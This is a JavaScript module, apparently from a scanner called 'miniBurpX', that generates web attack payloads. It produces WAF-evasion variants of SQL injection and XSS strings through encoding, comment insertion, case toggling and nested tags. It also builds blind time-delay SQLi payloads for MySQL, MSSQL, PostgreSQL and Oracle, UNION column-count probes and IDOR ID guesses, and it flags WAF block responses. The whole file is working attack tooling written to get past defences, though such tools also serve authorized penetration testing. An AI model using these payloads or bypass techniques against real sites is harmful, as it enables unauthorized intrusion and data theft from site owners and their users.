'use strict';
/**
 * WAF Bypass Engine
 * Generates evasion variants of payloads to bypass WAF rules.
 */

// URL-encode a character
const pct = (c) => '%' + c.charCodeAt(0).toString(16).toUpperCase().padStart(2,'0');
// Double-URL-encode a character
const pct2 = (c) => '%25' + c.charCodeAt(0).toString(16).toUpperCase().padStart(2,'0');

/**
 * Given a payload, generate WAF bypass variants.
 * @param {string} payload
 * @param {string} type - 'sqli'|'xss'|'generic'
 * @returns {string[]} array of variant payloads
 */
function generateVariants(payload, type = 'generic') {
  const variants = new Set();
  variants.add(payload); // always include original

  if (type === 'sqli') {
    // Comment insertion between keywords
    variants.add(payload.replace(/\sOR\s/gi, '/**/OR/**/'));
    variants.add(payload.replace(/\sAND\s/gi, '/**/AND/**/'));
    variants.add(payload.replace(/\sSELECT\s/gi, '/**/SELECT/**/'));
    variants.add(payload.replace(/\sUNION\s/gi, '/**/UNION/**/'));

    // Case toggling
    variants.add(payload.replace(/or/gi, m => m.split('').map((c,i) => i%2===0 ? c.toUpperCase() : c.toLowerCase()).join('')));
    variants.add(payload.toUpperCase());

    // URL encoding of quotes and spaces
    variants.add(payload.replace(/'/g, '%27').replace(/ /g, '+'));
    variants.add(payload.replace(/'/g, '%2527')); // Double encoded
    variants.add(payload.replace(/'/g, pct("'")).replace(/ /g, '%20'));

    // Scientific notation for numbers
    variants.add(payload.replace(/\b1\b/g, '1e0'));

    // Tab instead of space
    variants.add(payload.replace(/ /g, '\t'));
    variants.add(payload.replace(/ /g, '\r\n'));

    // MySQL inline comment
    variants.add(payload.replace(/--/, '-- -'));
    variants.add(payload.replace(/1=1/, '1 LIKE 1'));
    variants.add(payload.replace(/1=1/, '1<2'));

    // MSSQL variants
    variants.add(payload.replace(/SLEEP\((\d+)\)/i, 'WAITFOR DELAY \'0:0:$1\''));
  }

  if (type === 'xss') {
    // Tag case manipulation
    variants.add(payload.replace(/<script>/gi, '<ScRiPt>').replace(/<\/script>/gi, '</ScRiPt>'));
    // Attribute encoding
    variants.add(payload.replace(/on(\w+)=/gi, 'On$1='));
    // Entities
    variants.add(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
    // Unicode
    variants.add(payload.replace(/</g, '\u003c').replace(/>/g, '\u003e'));
    // Nested tags
    variants.add(payload.replace(/<script>/gi, '<scr<script>ipt>'));
    // SVG variant
    variants.add('<svg/onload=alert(1)>');
    variants.add('<img src=x onerror=alert(1)>');
    variants.add('"><svg onload=alert(1)>');
    // JS protocol
    variants.add('javascript:alert(1)');
  }

  return [...variants].filter(Boolean);
}

/**
 * Detect if a response looks like a WAF block.
 */
function isWafBlock(status, body = '') {
  if ([403, 406, 429, 503].includes(status)) return true;
  const lc = body.toLowerCase();
  return (
    lc.includes('access denied') ||
    lc.includes('blocked') ||
    lc.includes('forbidden') ||
    lc.includes('not acceptable') ||
    lc.includes('security check') ||
    lc.includes('cloudflare') ||
    lc.includes('incapsula') ||
    lc.includes('mod_security') ||
    lc.includes('request rejected')
  );
}

/**
 * Build a time-delay payload that works around WAF detection.
 * Returns multiple bypass variants for blind SQLi.
 */
function buildBlindPayloads(originalValue = '1', dialect = 'auto') {
  const payloads = [];

  // MySQL
  if (dialect === 'mysql' || dialect === 'auto') {
    payloads.push(`${originalValue} AND SLEEP(4)-- -`);
    payloads.push(`${originalValue}/**/AND/**/SLEEP(4)--`);
    payloads.push(`${originalValue}' AND SLEEP(4)-- -`);
    payloads.push(`${originalValue}' AND/**/SLEEP(4)-- -`);
    payloads.push(`1 OR SLEEP(4)-- -`);
  }

  // MSSQL
  if (dialect === 'mssql' || dialect === 'auto') {
    payloads.push(`${originalValue}; WAITFOR DELAY '0:0:4'--`);
    payloads.push(`${originalValue}' ; WAITFOR DELAY '0:0:4'--`);
    payloads.push(`1; WAITFOR DELAY '0:0:4'--`);
  }

  // PostgreSQL
  if (dialect === 'pgsql' || dialect === 'auto') {
    payloads.push(`${originalValue}' AND 4000=(SELECT 1 FROM PG_SLEEP(4))--`);
    payloads.push(`${originalValue}; SELECT pg_sleep(4)--`);
  }

  // Oracle
  if (dialect === 'oracle' || dialect === 'auto') {
    payloads.push(`${originalValue}' AND 1=UTL_HTTP.REQUEST('http://127.0.0.1')--`);
  }

  return payloads;
}

/**
 * Build UNION-based SELECT payloads for column count detection.
 * Returns payloads for 1–8 columns.
 */
function buildUnionPayloads(originalValue = '1') {
  const payloads = [];
  for (let cols = 1; cols <= 8; cols++) {
    const nulls = Array(cols).fill('NULL').join(',');
    payloads.push(`${originalValue} UNION SELECT ${nulls}--`);
    payloads.push(`${originalValue}' UNION SELECT ${nulls}--`);
    payloads.push(`${originalValue}/**/UNION/**/SELECT/**/${nulls}--`);
  }
  // String detection variants
  payloads.push(`' UNION SELECT 'miniBurpX',NULL--`);
  payloads.push(`' UNION SELECT NULL,'miniBurpX'--`);
  payloads.push(`' UNION SELECT NULL,NULL,'miniBurpX'--`);
  return payloads;
}

/**
 * generatePayloads(type, param, originalValue = '')
 * =====================================
 * Professional dynamic payload building for bug bounty level testing.
 */
function generatePayloads(type, param, originalValue = '') {
  const { VECTORS } = require('./vulnerabilityVectors');
  const base = VECTORS[type]?.payloads || [];
  const payloads = new Set(base);

  // CONTEXT-AWARE MUTATION RULES
  const isNumeric = (val) => !isNaN(val) && val !== '';
  const isUrl = (val) => String(val).startsWith('http') || String(val).includes('://');
  const isFile = (val) => String(val).includes('.') || String(val).includes('/') || String(val).includes('\\');

  if (type === 'sqli' && isNumeric(originalValue)) {
     payloads.add(`${originalValue} OR 1=1`);
     payloads.add(`${originalValue} AND SLEEP(5)`);
  }

  if (type === 'idor' && isNumeric(originalValue)) {
     const n = parseInt(originalValue);
     payloads.add((n - 1).toString());
     payloads.add((n + 1).toString());
     payloads.add('0');
  }

  // Generate evasion variants for each base payload
  const finalSet = new Set();
  [...payloads].forEach(p => {
     generateVariants(p, type).forEach(v => finalSet.add(v));
  });

  return Array.from(finalSet);
}

module.exports = { generateVariants, isWafBlock, buildBlindPayloads, buildUnionPayloads, generatePayloads };

